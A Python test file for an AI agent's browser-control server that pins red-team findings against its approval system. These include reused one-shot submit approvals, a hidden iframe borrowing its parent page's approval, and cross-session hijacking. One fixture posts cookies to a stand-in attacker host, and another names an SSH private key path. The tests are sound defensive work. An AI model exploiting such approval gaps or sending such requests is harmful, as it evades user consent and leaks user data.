"""What the red team actually got through, pinned so it cannot come back.

Each test here corresponds to a finding that was reproduced against the running
server, not to a hypothesis. They are grouped by the property that was broken
rather than by module, because the fixes crossed module boundaries: an approval
that outlived its action touched the store, the broker and every mutating tool.
"""

from __future__ import annotations

import time

import pytest

from lyra_browser.enforcement import classify
from lyra_browser.origin import parse_origin
from lyra_browser.permission import Capability, PermissionStore

SHOP = parse_origin("https://shop.example/")
PAY = parse_origin("https://pay.example/")


def held_by(ctx, name: str) -> None:
    """Put the browser in another session's hands, and mark that hand as live.

    Ownership now lapses when a holder goes quiet, so a test that only sets
    ``owner_session`` describes a holder who has already vanished.
    """
    ctx.owner_session = name
    ctx.owner_seen_at = time.monotonic()


class FakeClock:
    def __init__(self) -> None:
        self.now = 1000.0

    def __call__(self) -> float:
        return self.now

    def advance(self, seconds: float) -> None:
        self.now += seconds


class FakeRequest:
    """The three attributes ``classify`` reads, plus a frame to attribute it to."""

    def __init__(self, url: str, method: str = "GET", body=None, frame_url: str = "") -> None:
        self.url = url
        self.method = method
        self.post_data = body
        self.frame = FakeFrame(frame_url)

    def is_navigation_request(self) -> bool:
        return True


class FakeFrame:
    def __init__(self, url: str, parent: FakeFrame | None = None) -> None:
        self.url = url
        self.parent_frame = parent


# --- A submission must not outlive the click that bought it -------------------


def test_unused_submit_does_not_survive_its_action():
    """A declared submit that never submitted leaves no ticket behind.

    Declaring a GET form buys SUBMIT; the request that follows classifies as a
    plain navigation and spends nothing. Before the fix that left a ten-minute
    bearer ticket any later POST could ride.
    """
    store = PermissionStore(ttl_s=600.0, clock=FakeClock())
    bought = store.grant("s", SHOP, Capability.SUBMIT)
    assert store.check("s", SHOP, Capability.SUBMIT)

    store.release_unspent([bought])

    assert not store.check("s", SHOP, Capability.SUBMIT)


def test_release_leaves_a_spent_grant_alone_and_keeps_leases():
    """Releasing is not revoking: only unspent single-use scopes are retired."""
    store = PermissionStore(ttl_s=600.0, clock=FakeClock())
    lease = store.grant("s", SHOP, Capability.NAVIGATE)
    store.release_unspent([lease])
    assert store.check("s", SHOP, Capability.NAVIGATE), "a lease is not single-use"


async def test_click_hands_back_the_submit_it_did_not_use(make_ctx, tools_of, page):
    """The mechanism itself, not the store helper underneath it.

    This once called ``release_unspent`` by hand and then asked ``check`` without
    an initiator — which returns False for an initiator-scoped grant whether or
    not anything was released. It passed with ``released()`` deleted entirely.
    """
    ctx = make_ctx()
    ctx.config.scope_release_grace_s = 0  # drive the timer, do not reach past it
    tools = await tools_of(ctx)
    origin = parse_origin(page.url)

    result = await tools["click"](selector="#go", submits=True, confirm=True, reason="send")

    assert result["status"] == "ok"
    assert ("click", "#go") in page.calls, "the click really happened"
    assert not ctx.perms.check("default", origin, Capability.SUBMIT, origin), (
        "an unspent submission does not outlive the click that bought it"
    )


async def test_a_submit_that_was_used_is_not_double_released(make_ctx, tools_of, page):
    """Releasing must not be a second denial: what the request spent is spent."""
    ctx = make_ctx()
    ctx.config.scope_release_grace_s = 0
    tools = await tools_of(ctx)
    origin = parse_origin(page.url)

    await tools["click"](selector="#go", submits=True, confirm=True, reason="send")
    second = await tools["click"](selector="#go", submits=True, confirm=True, reason="send again")

    assert second["status"] == "ok", "a second declared submit asks again and may proceed"
    assert not ctx.perms.check("default", origin, Capability.SUBMIT, origin)


async def test_one_approved_submit_does_not_answer_the_next_one(make_ctx, tools_of, page):
    """The regression that made an approval a licence.

    Reading an unspent one-shot grant as "already approved" meant a single
    approved submission waved through every later ``submits=True`` call until
    something spent it — measured at 100 out of 100 through the broker.
    """
    ctx = make_ctx()
    tools = await tools_of(ctx)

    approved = await tools["click"](selector="#go", submits=True, confirm=True, reason="send")
    assert approved["status"] == "ok"

    unapproved = await tools["click"](selector="#buy", submits=True, confirm=False)

    assert unapproved["status"] == "needs_approval"
    assert ("click", "#buy") not in page.calls, "and the page was never touched"


# --- A submission is authorised by its sender, not its destination ------------


def test_cross_origin_form_is_judged_on_the_page_that_sends_it():
    """A payment form posting to a handler is ordinary, and must not be refused.

    No tool can know a form's action before the click without reading a DOM
    attribute that may change before it fires — the exact TOCTOU this layer
    exists to avoid. So the grant that authorises a submission is held on the
    origin doing the sending.
    """
    intent = classify(
        FakeRequest("https://pay.example/charge", "POST", "card=4111", "https://shop.example/")
    )
    assert intent is not None
    assert intent.capability is Capability.SUBMIT
    assert intent.subject == SHOP, "authorised by the sender"
    assert intent.target == PAY
    assert intent.leaves_origin, "and recorded as leaving"


def test_same_origin_submit_is_not_marked_as_leaving():
    intent = classify(
        FakeRequest("https://shop.example/checkout", "POST", "qty=1", "https://shop.example/cart")
    )
    assert intent is not None and not intent.leaves_origin


def test_submit_from_an_unknowable_frame_falls_back_to_the_destination():
    """Fail closed: an unattributable submission is judged on where it goes."""
    intent = classify(FakeRequest("https://pay.example/charge", "POST", "x=1", ""))
    assert intent is not None and intent.subject == PAY


# --- Approvals do not accumulate across tasks --------------------------------


async def test_open_browser_clears_earlier_grants(make_ctx, tools_of, page):
    """The design promised a reset here; nothing performed it."""
    ctx = make_ctx()
    tools = await tools_of(ctx)
    assert ctx.perms.check("default", parse_origin(page.url), Capability.INTERACT)

    await tools["open_browser"]()

    assert not ctx.perms.live_grants("default"), "opening the browser starts over"


def test_reapproving_a_scope_renews_it_instead_of_stacking():
    """A long session must not grow a grant list it scans linearly."""
    clock = FakeClock()
    store = PermissionStore(ttl_s=600.0, clock=clock)
    store.grant("s", SHOP, Capability.NAVIGATE)
    before = len(store.live_grants("s"))
    clock.advance(300)
    store.grant("s", SHOP, Capability.NAVIGATE)
    assert len(store.live_grants("s")) == before
    clock.advance(400)  # past the original expiry, inside the renewed one
    assert store.check("s", SHOP, Capability.NAVIGATE)


def test_expired_grants_are_pruned_for_every_session_not_just_the_one_asked():
    """An idle session's dead grants were kept alive by never being queried."""
    clock = FakeClock()
    store = PermissionStore(ttl_s=600.0, clock=clock)
    store.grant("idle", SHOP, Capability.NAVIGATE)
    clock.advance(1200)
    store.grant("busy", PAY, Capability.NAVIGATE)  # any write prunes everything
    assert store.live_grants("idle") == []


# --- One browser, one session ------------------------------------------------


async def test_a_second_session_is_refused_rather_than_silently_sharing(make_ctx, tools_of):
    """Sharing a browser is what makes per-session isolation undeliverable."""
    from lyra_browser.context import claim_session

    ctx = make_ctx()
    held_by(ctx, "someone-else")
    conflict = await claim_session(ctx)
    assert conflict is not None and conflict["status"] == "session_conflict"

    tools = await tools_of(ctx)
    result = await tools["click"](selector="#go", confirm=True)
    assert result["status"] == "session_conflict", "and no tool acts anyway"


# --- An approval is paid for once --------------------------------------------


async def test_consent_does_not_spend_the_grant_the_guard_still_needs(make_ctx):
    """Checking and enforcing are different layers; only one may consume.

    Not to be confused with reuse: this says the broker leaves the single use
    for the request it just approved. It must never let a *later* action read
    that same grant as prior approval — see the test above.
    """
    ctx = make_ctx()
    decision = await ctx.consent.request(
        action="click",
        origin=SHOP,
        capability=Capability.SUBMIT,
        session="default",
        initiator=SHOP,
        legacy_confirm=True,
    )
    assert decision
    assert ctx.perms.check("default", SHOP, Capability.SUBMIT, SHOP), (
        "the broker must leave the single use for the request that follows"
    )


@pytest.mark.parametrize("capability", [Capability.SUBMIT, Capability.DOWNLOAD])
def test_single_use_scopes_are_spent_by_the_first_request(capability):
    """SUBMIT is spent by the request that leaves, DOWNLOAD by the file that arrives
    (``downloads.py``): either way the first use is the last."""
    store = PermissionStore(ttl_s=600.0, clock=FakeClock())
    store.grant("s", SHOP, capability)
    assert store.consume("s", SHOP, capability)
    assert not store.consume("s", SHOP, capability), "and not by the second"


# --- A site sending itself elsewhere is leaving, and that is the design -------


def test_a_page_moving_itself_to_another_host_is_a_departure():
    """Ten rounds against eleven real sites refused exactly this, nine times.

    All nine were one site redirecting itself to a random subdomain. It is not a
    false positive: the guard cannot tell a cache-busting bounce from a hostile
    page escaping, and treating a different host as "staying put" would empty
    NAVIGATE of meaning. The refusal is recoverable — 204 leaves the original
    document standing and the audit names the destination — so the agent can
    read where it was sent and ask for it.
    """
    intent = classify(
        FakeRequest("https://x.neverssl.com/online", frame_url="https://neverssl.com/")
    )
    assert intent is not None
    assert intent.capability is Capability.NAVIGATE, "a different host is a different origin"


async def test_the_browser_can_be_handed_on_once_its_window_is_closed(make_ctx, tools_of):
    """Refusing a second session only holds up if the first can finish.

    Ownership had no release path: the hint told the caller to "wait for the
    holder to finish" while nothing could ever end a holder's turn, so over HTTP
    the first client owned the browser for the life of the process.
    """
    from lyra_browser.context import claim_session

    ctx = make_ctx()
    tools = await tools_of(ctx)
    await claim_session(ctx)
    assert ctx.owner_session == "default"

    await tools["close_browser"]()

    held_by(ctx, "someone-else")
    assert await claim_session(ctx) is None, "a closed window has no holder"
    assert ctx.owner_session == "default"


async def test_closing_the_browser_discards_the_approvals_it_earned(make_ctx, tools_of, page):
    ctx = make_ctx()
    tools = await tools_of(ctx)
    assert ctx.perms.check("default", parse_origin(page.url), Capability.INTERACT)
    await tools["close_browser"]()
    assert not ctx.perms.live_grants("default")


async def test_a_non_owner_cannot_close_the_holders_browser(make_ctx, tools_of, page):
    """Ending a turn must not be a way around whose turn it is.

    The release path added for the previous finding was itself ungated, so any
    session could shut the holder's window and drop the grants it was using —
    trading a lockout for a denial of service.
    """
    ctx = make_ctx()
    tools = await tools_of(ctx)
    held_by(ctx, "someone-else")  # a live holder, window still open

    result = await tools["close_browser"]()

    assert result["status"] == "session_conflict"
    assert ctx.session.started, "the holder's window is untouched"
    assert ctx.perms.check("default", parse_origin(page.url), Capability.INTERACT)


# --- A refusal is reported as policy; anything else is reported as itself -----


async def test_a_navigation_the_guard_did_not_refuse_still_raises(make_ctx, tools_of, page):
    """``ERR_ABORTED`` is also what a download reports, and a page going away.

    Matching the message alone would announce those as policy blocks, sending
    the agent to look for an approval that was never the problem. The guard's
    own refusal count is what separates them.
    """

    async def explode(url, wait_until=None):
        raise RuntimeError("Page.goto: net::ERR_ABORTED at https://start.example/file.zip")

    ctx = make_ctx()
    page.goto = explode
    tools = await tools_of(ctx)

    with pytest.raises(RuntimeError):
        await tools["navigate"](url="https://start.example/file.zip", confirm=True)


async def test_a_navigation_the_guard_did_refuse_comes_back_as_an_envelope(
    make_ctx, tools_of, page
):
    async def explode(url, wait_until=None):
        ctx.guard.refusals += 1  # what the route handler does on a 204
        raise RuntimeError("Page.goto: net::ERR_ABORTED at https://start.example/next")

    ctx = make_ctx()
    page.goto = explode
    tools = await tools_of(ctx)

    result = await tools["navigate"](url="https://start.example/next", confirm=True)

    assert result["status"] == "blocked_by_policy"


async def test_a_frame_with_no_origin_cannot_spend_its_parents_submit(make_ctx):
    """An injected about:blank iframe borrowed the page's approval, invisibly.

    Attribution and authority are not the same thing: naming the embedding page
    as the source of a navigation is reasonable, letting a frame with no origin
    of its own spend that page's SUBMIT is not — and a subframe navigating
    leaves the top document exactly as it was, so nothing shows.
    """
    top = FakeFrame("https://shop.example/")
    hidden = FakeFrame("about:blank", parent=top)

    away = FakeRequest("https://attacker.example/collect", "POST", "cookie=x")
    away.frame = hidden
    intent = classify(away)
    assert intent is not None
    assert intent.subject != SHOP, "the parent's approval is not the frame's to spend"
    assert intent.subject == PAY.__class__(scheme="https", host="attacker.example", port=None)

    # The half the first fix missed: posting to the parent's *own* origin matched
    # on both subject and initiator, so the frame spent the parent's approval
    # while the audit line was indistinguishable from the parent submitting.
    home = FakeRequest("https://shop.example/transfer", "POST", "amount=9999")
    home.frame = hidden
    inward = classify(home)
    assert inward is not None
    assert inward.initiator != SHOP, "authority is not borrowed through initiator either"


async def test_a_takeover_cannot_be_declared_by_a_session_that_is_not_driving(make_ctx, tools_of):
    """Freezing every mutating tool is a mutation of shared state.

    ``close_browser`` was gated for exactly this reason and this one was not, so
    any session could hold the owner still and keep doing it.
    """
    ctx = make_ctx()
    tools = await tools_of(ctx)
    held_by(ctx, "someone-else")

    result = await tools["request_takeover"](reason="mine now")

    assert result["status"] == "session_conflict"
    assert not ctx.collab.takeover, "the owner keeps working"


def test_an_unreadable_enforcement_mode_does_not_become_a_third_state():
    """Refusing without spending turns every one-shot grant into a lease."""
    from lyra_browser.config import Config

    cfg = Config(enforcement_mode="enfroce")
    assert cfg.enforcement_mode == "enforce", "a typo falls back, it does not invent a mode"


# --- Fixes that the suite did not notice were fixes ---------------------------


def test_a_launching_browser_counts_as_open():
    """``started`` is False for the seconds a launch takes.

    Ownership was released on ``not started``, so a second client claimed the
    browser the first was still waiting for, and the first was never told. Tested
    on the real session class: the fake used to answer for it and reverting the
    fix left the whole suite green.
    """
    from lyra_browser.config import Config
    from lyra_browser.session import BrowserSession

    session = BrowserSession(Config())
    assert not session.live, "nothing open, nothing opening"

    session._starting = True
    assert not session.started, "the context does not exist yet"
    assert session.live, "but the window is on its way and has a holder"


async def test_a_guard_that_refuses_must_also_spend(make_ctx):
    """The two halves must share one condition.

    A mode string that is neither word refused ungranted traffic like enforce while
    never consuming, so every one-shot approval became unlimited for its TTL.
    ``NavigationGuard`` takes a mode directly, bypassing Config's normalisation, so the
    only thing that can catch it is what the guard does with a single-use grant.
    """
    from lyra_browser.enforcement import NavigationGuard

    ctx = make_ctx()
    guard = NavigationGuard(ctx.config, ctx.perms, ctx.audit, mode="not-a-mode")  # type: ignore[arg-type]
    ctx.perms.grant(guard.session_key, SHOP, Capability.SUBMIT, SHOP)

    class Route:
        def __init__(self) -> None:
            self.calls: list[str] = []

        async def continue_(self) -> None:
            self.calls.append("continue")

        async def fulfill(self, **kwargs) -> None:
            self.calls.append(f"fulfill {kwargs.get('status')}")

    def post() -> FakeRequest:
        return FakeRequest(
            "https://shop.example/buy", "POST", "x=1", frame_url="https://shop.example/"
        )

    first, second = Route(), Route()
    await guard(first, post())
    await guard(second, post())

    assert first.calls == ["continue"], "the approval pays for one submission"
    assert second.calls == ["fulfill 204"], "and a mode that refuses must also have spent it"


def test_two_approved_submissions_do_not_share_one_use():
    """One call's cleanup must not retire another call's fresh approval."""
    store = PermissionStore(ttl_s=600.0, clock=FakeClock())
    first = store.grant("s", SHOP, Capability.SUBMIT, SHOP)
    second = store.grant("s", SHOP, Capability.SUBMIT, SHOP)

    assert first is not second, "a one-shot approval is never merged into another"

    store.release_unspent([first])
    assert store.check("s", SHOP, Capability.SUBMIT, SHOP), "the second still stands"


def test_approving_one_local_file_does_not_authorise_another():
    """Every ``file:`` URL is one origin, so the grant has to name the file.

    The prompt says which document it is asking about. Without pinning the URL
    the grant behind it covered the whole disk for one use, and whichever local
    navigation arrived first spent it.
    """
    store = PermissionStore(ttl_s=600.0, clock=FakeClock())
    report = "file:///Users/me/report.html"
    private_key = "file:///Users/me/.ssh/id_rsa"
    origin = parse_origin(report)

    store.grant("s", origin, Capability.NAVIGATE, None, report)

    assert not store.consume("s", origin, Capability.NAVIGATE, None, private_key)
    assert store.consume("s", origin, Capability.NAVIGATE, None, report)


async def test_ownership_is_not_released_while_the_window_is_still_opening(make_ctx):
    """The seconds a launch takes are not "no window, so no holder".

    ``claim_session`` released on ``not started``, which is False for the whole
    of ``launch_persistent_context`` — and the claim happens before that await.
    A second client walked in during the first one's launch, and the first was
    never told it had lost the browser its own approvals were being filed under.
    """
    from lyra_browser.context import claim_session

    ctx = make_ctx()
    held_by(ctx, "someone-else")
    ctx.session.started = False
    ctx.session.starting = True  # mid-launch: no context yet, but a window coming

    conflict = await claim_session(ctx)

    assert conflict is not None and conflict["status"] == "session_conflict"
    assert ctx.owner_session == "someone-else", "the launch belongs to whoever started it"


async def test_a_holder_that_stops_calling_hands_the_browser_on(make_ctx):
    """Closing is owner-only, so a client that drops must not lock the server.

    The refusal tells the next session to wait for the holder to finish. A
    holder whose process died cannot finish, and the window stays open, so
    nothing else released ownership.
    """
    from lyra_browser.context import claim_session

    ctx = make_ctx()
    held_by(ctx, "someone-else")
    assert await claim_session(ctx) is not None, "a working holder keeps the browser"

    ctx.owner_seen_at = time.monotonic() - (ctx.config.owner_idle_timeout_s + 1)

    assert await claim_session(ctx) is None, "one that went quiet does not"
    assert ctx.owner_session == "default"
    assert not ctx.session.started, "and the window went with the ownership"
    assert not ctx.perms.live_grants("someone-else"), "as did what it had approved"


async def test_a_guard_that_crashed_is_not_reported_as_a_policy_refusal(make_ctx):
    """Sending an agent to seek an approval that cannot help hides a broken guard."""

    class ExplodingRoute:
        def __init__(self):
            self.calls = []

        async def continue_(self):
            self.calls.append("continue")

        async def fulfill(self, **kw):
            self.calls.append(("fulfill", kw.get("status")))

    ctx = make_ctx()
    guard, route = ctx.guard, ExplodingRoute()
    before = guard.refusals

    await guard._fail_closed(route, RuntimeError("guard is broken"))

    assert route.calls == [("fulfill", 204)], "it still fails closed"
    assert guard.refusals == before, "but it is not a refusal for lack of approval"


async def test_a_refused_capability_does_not_leave_the_earlier_ones_behind(make_ctx):
    """The action is not happening, so nothing bought for it may linger."""
    from lyra_browser.tools.scope import require

    ctx = make_ctx()
    ctx.config.consent_channel = "legacy"
    denied, bought = await require(
        ctx,
        "click",
        target=SHOP,
        capabilities=[Capability.SUBMIT, Capability.DOWNLOAD],
        initiator=SHOP,
        confirm=False,  # the first capability is refused, so the second never runs
    )

    assert denied is not None and bought == []
    assert not ctx.perms.check("default", SHOP, Capability.SUBMIT, SHOP)


async def test_a_window_that_closed_takes_its_approvals_with_it(make_ctx, tools_of, page):
    """Both ways of letting go must drop grants, not just the tidy one.

    The idle-handoff path revoked and the window-closed path did not, so a
    browser that went away by any route other than ``close_browser`` left its
    approvals behind for whoever claimed the session next.
    """
    from lyra_browser.context import claim_session

    ctx = make_ctx()
    await tools_of(ctx)
    held_by(ctx, "someone-else")
    assert ctx.perms.check("default", parse_origin(page.url), Capability.INTERACT)

    ctx.session.started = False  # the window went away on its own
    await claim_session(ctx)

    assert ctx.owner_session == "default", "the browser is claimable"
    assert not ctx.perms.live_grants("default"), "and carries nothing over"


async def test_reading_neither_claims_the_browser_nor_takes_it_from_anyone(
    make_ctx, tools_of, page
):
    """Reading is not driving.

    Every tool went through the same claim, so a passive client could take the
    browser by asking for a screenshot — and once an idle holder could be
    displaced, that screenshot would close a working session's window. Reads
    check who is driving; they never become the driver.
    """
    ctx = make_ctx()
    tools = await tools_of(ctx)

    assert (await tools["get_url"]())["url"] == page.url
    assert ctx.owner_session is None, "reading left the browser unclaimed"

    held_by(ctx, "someone-else")
    ctx.owner_seen_at -= ctx.config.owner_idle_timeout_s + 1  # holder looks gone

    refused = await tools["read_page"]()

    assert refused["status"] == "session_conflict", "and does not read another's session"
    assert ctx.session.started, "nor close their window on the way past"
    assert ctx.owner_session == "someone-else"


async def test_closing_an_already_closed_browser_still_lets_go(make_ctx, tools_of):
    """A close that reports success must not leave the caller holding the browser.

    Claiming happens before the "was not open" shortcut, so this path acquired
    ownership on the way past and then returned ok without releasing it — the
    caller ended up owning a window that does not exist.
    """
    ctx = make_ctx()
    tools = await tools_of(ctx)
    ctx.session.started = False  # already gone

    result = await tools["close_browser"]()

    assert result["status"] == "ok"
    assert ctx.owner_session is None, "nobody holds a browser that is not there"
    assert not ctx.perms.live_grants("default")


async def test_two_sessions_arriving_together_do_not_both_get_in(make_ctx, monkeypatch):
    """Ownership is read, awaited across, and written — so it needs a lock.

    A handoff awaits the window closing. Without serialisation a second session
    could claim during that await and the first call would then write ``None``
    over it, erasing an owner that had just been established, and admit itself.
    """
    import asyncio

    from lyra_browser import context as ctx_module

    ctx = make_ctx()
    held_by(ctx, "gone")
    ctx.owner_seen_at -= ctx.config.owner_idle_timeout_s + 1

    slow = asyncio.Event()

    async def slow_stop():
        # Hold the handoff open. The window is not marked closed: a closed one
        # has no holder anyway, and that would be a legitimate second claim
        # rather than the interleaving this is about.
        await slow.wait()

    ctx.session.stop = slow_stop
    names = iter(["first", "second"])
    monkeypatch.setattr(ctx_module, "_live_session_id", lambda: next(names, "second"))

    a = asyncio.create_task(ctx_module.claim_session(ctx))
    await asyncio.sleep(0)  # let A reach the await inside the handoff
    b = asyncio.create_task(ctx_module.claim_session(ctx))
    await asyncio.sleep(0)
    slow.set()
    results = await asyncio.gather(a, b)

    admitted = [r for r in results if r is None]
    assert len(admitted) == 1, f"exactly one session drives the browser, got {results}"
    assert ctx.owner_session == "first", "and it is the one that was let in"


# --- Takeover means the user is driving, including through the guard ----------


async def test_the_user_is_not_refused_their_own_browser_during_a_takeover(make_ctx):
    """Grants record what the *agent* was allowed to do.

    The guard measured every navigation against them, so a takeover handed the
    user a browser that would not navigate — and takeover exists for exactly the
    passwords, CAPTCHAs, 2FA and payments the agent must not do alone, every one
    of which is a navigation. The audit says who drove.
    """
    ctx = make_ctx(on_site=False)
    ctx.collab.takeover = True
    route = _Route()

    await ctx.guard(route, _Nav("https://bank.example/2fa", "https://bank.example/login"))

    assert route.calls == ["continue"], "the person at the keyboard is the approval"
    entry = _last_audit(ctx)
    assert entry["status"] == "user_driven", "and the trail says so, not 'allowed'"


async def test_the_agent_is_still_judged_while_the_user_holds_the_session(make_ctx):
    ctx = make_ctx(on_site=False)
    ctx.collab.takeover = False
    route = _Route()

    await ctx.guard(route, _Nav("https://bank.example/2fa", "https://bank.example/login"))

    assert route.calls == [("fulfill", 204)]


class _Route:
    def __init__(self) -> None:
        self.calls: list = []

    async def continue_(self) -> None:
        self.calls.append("continue")

    async def fulfill(self, **kwargs) -> None:
        self.calls.append(("fulfill", kwargs.get("status")))


class _Nav:
    def __init__(self, url: str, frame_url: str) -> None:
        self.url = url
        self.method = "GET"
        self.post_data = None
        self.frame = FakeFrame(frame_url)

    def is_navigation_request(self) -> bool:
        return True


def _last_audit(ctx) -> dict:
    import json

    lines = [x for x in ctx.config.audit_path.read_text().splitlines() if x.strip()]
    return json.loads(lines[-1])


async def test_reading_keeps_a_holder_from_looking_idle(make_ctx, tools_of):
    """Not claiming must not mean not counting.

    Reads stopped claiming so a passive client could not take the browser — and
    that also stopped them refreshing the holder's clock, so a session part-way
    through a read-only pass was displaced and had its window closed underneath
    it.
    """
    from lyra_browser.context import claim_session

    ctx = make_ctx()
    tools = await tools_of(ctx)
    await claim_session(ctx)  # "default" is driving
    ctx.owner_seen_at -= ctx.config.owner_idle_timeout_s - 1  # nearly stale

    await tools["read_page"]()

    stale_after = time.monotonic() - ctx.owner_seen_at
    assert stale_after < 1, "the read counted as using the browser"
